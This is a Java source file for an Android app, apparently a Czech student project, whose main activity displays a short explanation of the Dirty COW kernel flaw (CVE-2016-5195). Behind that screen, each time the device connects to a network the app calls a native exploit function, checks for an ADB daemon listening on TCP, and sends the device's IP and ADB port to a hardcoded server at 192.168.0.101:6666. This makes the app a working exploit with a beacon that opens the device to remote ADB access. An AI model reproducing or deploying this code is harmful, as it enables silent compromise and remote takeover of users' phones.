// Autor: Vit Soucek (soucevi1@fit.cvut.cz)
// Zdroje prevzateho kodu jsou uvedeny primo u danych prevzatych casti.

package com.bp.dirtycow;

import android.content.IntentFilter;
import android.content.pm.PermissionInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.v4.content.PermissionChecker;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.util.Patterns;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.security.Permission;
import java.security.Permissions;
import java.util.Collections;
import java.util.List;

public class MainActivity extends AppCompatActivity implements ConnectionReceiver.ConnectionReceiverListener {

    private static String APP_TAG = "DIRTY_COW";    // Tag, ktery se zobrazi u vypisu
    private int SERVER_PORT = 6666;                 // Port, na ktery odejde zprava o utoku
    private String IP_ADDRESS = "192.168.0.101";    // Adresa, na kterou odejde zprava o utoku
    private int ADB_PORT = 5556;                    // Port, na kterem posloucha ADB na zarizeni

    private CClient mClient;
    private String ADBport = "0";


    ConnectionReceiver receiver = new ConnectionReceiver();
    IntentFilter intentFilter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");

    // Nacteni C/C++ knihovny
    static {
        System.loadLibrary("dirty-cow-lib");
    }

    // Pri vytvoreni aktivity se inicializuje textove pole, obrazek a zacne poslouchat receiver,
    // ktery zjistuje, zda je aplikace pripojena k siti, popr. jestli se tento stav zmenil
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView tv = (TextView) findViewById(R.id.text_view1);
        String longtext = "Zranitelnost linuxového jádra CVE-2016-5195, které se přezdívá Dirty Cow," +
                " umožňuje případnému útočníkovi v systému zapsat do souboru, který má útočník právo pouze číst. " +
                "To provede tak, že vyvolá souběh dvou vláken a zneužije chybu v implementaci zpracovávání techniky " +
                "copy on write (odtud také přezdívka Dirty COW). Zranitelnost má vlastní logo, účet na GitHubu" +
                " a webové stránky.";
        tv.setText(longtext);
        this.registerReceiver(receiver, intentFilter);
    }

    // Metoda, ktera definuje chovani pri zmene stavu site
    @Override
    public void onNetworkConnectionChanged(boolean isConnected) {
        if(!isConnected) {
            Log.e(APP_TAG, "* Not connected to the network now");
        }else{
            Log.e(APP_TAG, "* Connected to the network now");
            initAttack();
        }

    }

    @Override
    public void onResume() {
        super.onResume();
        BPApplication.getInstance().setConnectionListener(this);
    }

    // Deklarace funkce z nativni knihovny jako Java metody
    public native int dirtyCow(String path, int sdk_version);

    // Metoda zahajujici utok
    private void initAttack(){
        // Kontrola, jestli uz ADB nebezi
        try {
            if (checkPreviousAttack()) {
                sendAddress(ADB_PORT);
                return;
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        // Zjiteni cesty, kam lze ukladat soubory
        File f = this.getExternalFilesDir(null);
        String path = Environment.getExternalStorageDirectory().getPath();
        if (f != null) {
            path = f.getPath();
        } else{
            Log.e(APP_TAG, "* The path for dumping files not found");
            path = null;
        }

        // Zjisteni verze OS
        int sdk_version = Build.VERSION.SDK_INT;

        // Utok
        int r = dirtyCow(path, sdk_version);
        if (r == -1) {
            Log.e(APP_TAG, "* The attack was not successful");
        } else {
            // Odeslani adresy a portu
            sendAddress(ADB_PORT);
        }
    }

    // Metoda provadejici kontrolu, jestli utok jiz byl proveden
    public boolean checkPreviousAttack() throws IOException, InterruptedException {
        String str1 = "def", str2 = "def", string1, string2;

        // Property init.svc.adbd by mela byt "running"
        Log.e(APP_TAG, "* Checking previous attack");
        string1 = runProcess(new String[]{"getprop", "init.svc.adbd"});

        if(string1.length() > 0 && string1.charAt(string1.length()-1) == '\n'){
            str1 = string1.substring(0, string1.length() - 1);
        } else if(string1.length() > 0){
            str1 = string1;
        } else{
            ADBport = "0";
            return false;
        }

        if(! str1.equals("running")){
            ADBport = "0";
            Log.e(APP_TAG,"    - adbd not running");
            return false;
        }

        // Alespon jedna z techto properties by mela byt nastavena na cislo
        string1 = runProcess(new String[]{"getprop", "persist.adb.tcp.port"});
        string2 = runProcess(new String[]{"getprop", "service.adb.tcp.port"});

        str1 = string1;
        str2 = string2;

        if(string1.length() > 0 && string1.charAt(string1.length()-1) == '\n') {
            str1 = string1.substring(0, string1.length() - 1);
        }

        if(string2.length() > 0 && string2.charAt(string2.length()-1) == '\n'){
            str2 = string2.substring(0, string2.length() -1 );
        }
        String portStr;
        if(str1.length() == 0){
            if(str2.length() == 0){
                return false;
            } else{
                portStr = str2;
            }
        } else{
            portStr = str1;
        }

        int s1;
        if(! android.text.TextUtils.isDigitsOnly(portStr) ){
            Log.e(APP_TAG, "    port not digits only");
            for(int i=0; i<portStr.length(); i++){
                Log.e(APP_TAG, "    Port: " + portStr.charAt(i));
            }
            ADBport = "0";
            return false;
        } else {
            s1 = Integer.parseInt(portStr);
            if(s1 == 0){
                Log.e(APP_TAG, "    Port is 0");
                ADBport = "0";
                return false;
            }
            ADBport = portStr;
            Log.e(APP_TAG, "    Port already set: " + ADBport);
            return true;
        }
    }

    // Metoda, ktera odesle IP adresu a port zarizeni
    public void sendAddress(int portNum){
        String deviceIP = getIPAddress();

        Log.e(APP_TAG, "* Getting addresses");
        if(! isValidIP(deviceIP) ){
            Log.e(APP_TAG, "    " + deviceIP + " is not a valid address");
            return;
        }

        Log.e(APP_TAG, "    Device address: " + deviceIP);

        if(! isValidIP(IP_ADDRESS)){
            Log.e(APP_TAG, "    Invalid address: " + IP_ADDRESS);
            return;
        }
        Log.e(APP_TAG, "    Server address: " + IP_ADDRESS);

        mClient = new CClient(IP_ADDRESS, SERVER_PORT, deviceIP + ":" + portNum);

        Thread clientThread = new Thread(mClient);
        clientThread.start();
    }

    // Metoda provadejici overeni formy IP adresy
    public boolean isValidIP(String ip){
        return Patterns.IP_ADDRESS.matcher(ip).matches();
    }

    // Metoda, ktera ziska adresu tohoto zarizeni
    //      zdroj: https://stackoverflow.com/a/13007325/6136143
    public static String getIPAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        //boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
                        boolean isIPv4 = sAddr.indexOf(':')<0;
                        if (isIPv4)
                            return sAddr;

                    }
                }
            }
        } catch (Exception ex) {
            Log.e(APP_TAG, ex.toString());
        }
        return "";
    }

    // Metoda, ktera vytvori proces v systemu
    private String runProcess(String [] cmd) throws IOException, InterruptedException {
        Process su = Runtime.getRuntime().exec(cmd);
        StringBuilder log;

        StringBuilder builder = new StringBuilder();
        for(String s : cmd) {
            if(s == "su" || s == "-c"){
                continue;
            }
            builder.append(s + " ");
        }
        String command = builder.toString();


        Log.e(APP_TAG, "    " + command + ":");

        Log.e(APP_TAG,"        - process created");

        String output;

        log = getProcessOutput(su.getInputStream());
        output = log.toString();
        if(output.charAt(output.length() - 1) == '\n'){
            output = log.toString().substring(0, log.toString().length() - 1);
        }
        Log.e(APP_TAG, "        - output: \"" + output + "\"");
        log = getProcessOutput(su.getErrorStream());
        Log.e(APP_TAG,  "        - error output: \"" + log.toString() + "\"");
        su.waitFor();
        int eVal = su.exitValue();
        Log.e(APP_TAG, "        - exited with: \"" + eVal + "\"");
        return output;
    }

    // Pomocna metoda pro ziskani vystupu vytvoreneho procesu
    //      zdroj: https://stackoverflow.com/a/13506836/6136143
    private StringBuilder getProcessOutput(InputStream inputStream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        StringBuilder log = new StringBuilder();
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            log.append(line + "\n");
        }
        return log;
    }
}
